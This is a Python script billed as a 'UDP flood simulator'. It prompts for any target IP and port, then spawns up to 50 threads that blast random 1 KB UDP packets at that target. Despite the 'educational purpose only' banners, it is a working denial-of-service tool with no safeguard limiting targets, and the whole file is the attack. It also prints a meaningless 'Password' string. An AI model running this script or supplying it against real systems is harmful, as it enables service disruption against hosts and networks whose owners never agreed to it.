#!/usr/bin/env python3

"""
AURA UDP FLOOD SIMULATOR
⚠️ EDUCATIONAL PURPOSE ONLY - Test YOUR own servers only ⚠️
Password: AuraV6
"""

import socket
import threading
import time
import random

print("╔══════════════════════════════════════════════════════════════╗")
print("║              🔥 AURA UDP FLOOD SIMULATOR 🔥                  ║")
print("║           ⚠️  EDUCATIONAL PURPOSE ONLY ⚠️                    ║")
print("╚══════════════════════════════════════════════════════════════╝")
print("")

target_ip = input("Enter target IP (YOUR own server only): ")
target_port = int(input("Enter target port (e.g., 53 for DNS): "))
packets = int(input("Enter number of UDP packets to send: "))
threads = int(input("Enter number of threads (1-50): "))

if threads > 50:
    threads = 50

print(f"\n🔥 Sending {packets} UDP packets to {target_ip}:{target_port} with {threads} threads...")

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = random._urandom(1024)  # Random 1KB payload
    
    for _ in range(packets // threads):
        try:
            sock.sendto(message, (target_ip, target_port))
            print("✓ UDP packet sent")
            time.sleep(0.001)
        except:
            print("✗ Failed to send")
    sock.close()

# Start threads
thread_list = []
for i in range(threads):
    thread = threading.Thread(target=udp_flood)
    thread.start()
    thread_list.append(thread)

for thread in thread_list:
    thread.join()

print(f"\n✅ UDP flood simulation complete - {packets} packets sent")
print("🔐 Password: AuraV6")
